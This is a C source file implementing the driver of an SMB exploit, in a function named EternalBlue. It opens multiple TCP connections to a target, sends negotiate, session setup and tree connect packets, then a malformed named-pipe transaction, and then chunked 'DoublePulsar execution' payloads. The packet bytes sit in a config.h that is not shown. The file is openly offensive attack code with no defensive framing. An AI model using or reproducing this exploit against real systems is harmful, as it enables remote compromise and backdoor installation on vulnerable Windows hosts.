#define _GNU_SOURCE
#include "config.h"

#include <errno.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

static int send_all(int fd, const void *buffer, size_t length)
{
    const unsigned char *data = buffer;
    size_t offset = 0;

    while (offset < length) {
        ssize_t sent = send(fd, data + offset, length - offset, MSG_NOSIGNAL);
        if (sent < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (sent == 0) {
            errno = EPIPE;
            return -1;
        }
        offset += (size_t)sent;
    }
    return 0;
}

static int send_in_chunks(int fd, const void *buffer, size_t length,
                          size_t chunk_size)
{
    const unsigned char *data = buffer;
    size_t offset = 0;

    if (chunk_size == 0) {
        errno = EINVAL;
        return -1;
    }

    while (offset < length) {
        size_t amount = length - offset;
        if (amount > chunk_size)
            amount = chunk_size;
        if (send_all(fd, data + offset, amount) < 0)
            return -1;
        offset += amount;
    }
    return 0;
}

static int connect_tcp(const char *ip, int port)
{
    struct addrinfo hints;
    struct addrinfo *addresses = NULL;
    struct addrinfo *address;
    char service[16];
    int fd = -1;
    int result;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    result = snprintf(service, sizeof(service), "%d", port);
    if (result < 0 || (size_t)result >= sizeof(service)) {
        errno = EINVAL;
        return -1;
    }

    result = getaddrinfo(ip, service, &hints, &addresses);
    if (result != 0) {
        printf("Failed to resolve %s:%d: %s\n", ip, port,
               gai_strerror(result));
        errno = EHOSTUNREACH;
        return -1;
    }

    for (address = addresses; address != NULL; address = address->ai_next) {
        fd = socket(address->ai_family, address->ai_socktype,
                    address->ai_protocol);
        if (fd < 0)
            continue;
        if (connect(fd, address->ai_addr, address->ai_addrlen) == 0)
            break;
        close(fd);
        fd = -1;
    }

    freeaddrinfo(addresses);
    return fd;
}

int EternalBlue(const char *ip, int port)
{
    int *sockets;
    int status = -1;
    int i;
    size_t chunk_size = (size_t)SMB_CHUNK_SIZE;

    if (ip == NULL || port < 1 || port > 65535 || NUM_SOCKETS < 1 ||
        chunk_size == 0) {
        printf("Invalid EternalBlue connection parameters\n");
        return -1;
    }

    sockets = calloc((size_t)NUM_SOCKETS, sizeof(*sockets));
    if (sockets == NULL) {
        printf("Failed to allocate socket list: %s\n", strerror(errno));
        return -1;
    }
    for (i = 0; i < NUM_SOCKETS; i++)
        sockets[i] = -1;

    for (i = 0; i < NUM_SOCKETS; i++) {
        printf("Opening TCP connection %d to %s:%d\n", i, ip, port);
        sockets[i] = connect_tcp(ip, port);
        if (sockets[i] < 0) {
            printf("Failed to connect socket %d: %s\n", i, strerror(errno));
            goto cleanup;
        }

        printf("Socket %d: sending SMB negotiate packet\n", i);
        if (send_all(sockets[i], SMB_NEGOTIATE_PKT,
                     sizeof(SMB_NEGOTIATE_PKT)) < 0) {
            printf("Failed to send SMB negotiate packet on socket %d: %s\n",
                   i, strerror(errno));
            goto cleanup;
        }

        printf("Socket %d: sending SMB session setup packet\n", i);
        if (send_all(sockets[i], SMB_SESSION_SETUP_PKT,
                     sizeof(SMB_SESSION_SETUP_PKT)) < 0) {
            printf("Failed to send SMB session setup packet on socket %d: %s\n",
                   i, strerror(errno));
            goto cleanup;
        }

        printf("Socket %d: sending SMB tree connect packet\n", i);
        if (send_all(sockets[i], SMB_TREE_CONNECT_PKT,
                     sizeof(SMB_TREE_CONNECT_PKT)) < 0) {
            printf("Failed to send SMB tree connect packet on socket %d: %s\n",
                   i, strerror(errno));
            goto cleanup;
        }
    }

    printf("Socket 0: sending malformed SMB named-pipe transaction packet in chunks\n");
    if (send_in_chunks(sockets[0], SMB_TRANS_NAMED_PIPE_PKT,
                       sizeof(SMB_TRANS_NAMED_PIPE_PKT), chunk_size) < 0) {
        printf("Failed to send malformed SMB named-pipe transaction packet: %s\n",
               strerror(errno));
        goto cleanup;
    }

    for (i = 2; i < NUM_SOCKETS; i++) {
        printf("Socket %d: sending DoublePulsar execution payload in chunks\n",
               i);
        if (send_in_chunks(sockets[i], DP_EXEC_PKT, sizeof(DP_EXEC_PKT),
                           chunk_size) < 0) {
            printf("Failed to send DoublePulsar payload on socket %d: %s\n",
                   i, strerror(errno));
            goto cleanup;
        }
    }

    status = 0;

cleanup:
    for (i = 0; i < NUM_SOCKETS; i++) {
        if (sockets[i] >= 0) {
            printf("Closing socket %d\n", i);
            if (close(sockets[i]) < 0) {
                printf("Failed to close socket %d: %s\n", i, strerror(errno));
                status = -1;
            }
            sockets[i] = -1;
        }
    }
    free(sockets);
    return status;
}